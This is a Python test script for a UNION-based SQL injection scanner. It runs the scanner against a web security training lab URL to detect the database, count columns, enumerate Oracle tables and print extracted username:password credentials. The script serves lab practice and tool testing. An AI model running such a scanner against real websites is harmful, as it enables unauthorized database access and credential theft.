"""
Test Oracle enumeration engine.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.modules.scanner.modules.union_sqli import UnionSQLiScanner
from app.modules.scanner.modules.oracle_enum import OracleEnum, oracle_enumeration


def test_oracle_enum():
    """Test Oracle enumeration on Lab 6."""
    TARGET = "https://0a3700b1040c467b80b6081e0036005e.web-security-academy.net/filter?category=Gifts"

    print("=" * 60)
    print("Testing Oracle Enumeration")
    print("=" * 60)

    scanner = UnionSQLiScanner(TARGET)
    scanner.parameter = "category"

    # Run detection
    scanner.detected_dbms = scanner._detect_dbms()
    print(f"\n✅ DBMS: {scanner.detected_dbms}")

    scanner.column_count = scanner._detect_column_count()
    print(f"✅ Column Count: {scanner.column_count}")

    scanner.visible_columns = scanner._detect_visible_columns(scanner.column_count)
    print(f"✅ Visible Columns: {scanner.visible_columns}")

    # ============================================================
    # Run Oracle enumeration with correct parameters
    # ============================================================
    print("\n" + "=" * 60)
    print("Oracle Enumeration")
    print("=" * 60)

    # Pass visible_columns and column_count to OracleEnum
    enum = OracleEnum(
        scanner=scanner,
        visible_columns=scanner.visible_columns,
        column_count=scanner.column_count,
    )
    result = enum.run()

    print("\n" + "=" * 60)
    print("RESULTS")
    print("=" * 60)

    print(f"Tables: {len(result.get('tables', []))}")
    for table in result.get("tables", [])[:10]:
        print(f"  - {table}")

    print(f"\nUser Table: {result.get('user_table')}")

    columns = result.get("columns", {})
    for table, cols in columns.items():
        print(f"Columns in {table}: {len(cols)}")
        for col in cols[:10]:
            print(f"  - {col}")

    print(f"\nCredentials: {len(result.get('credentials', []))}")
    for cred in result.get("credentials", []):
        print(f"  {cred.get('username')}:{cred.get('password')}")

    print(f"\nLab Solved: {result.get('lab_solved', False)}")


if __name__ == "__main__":
    test_oracle_enum()
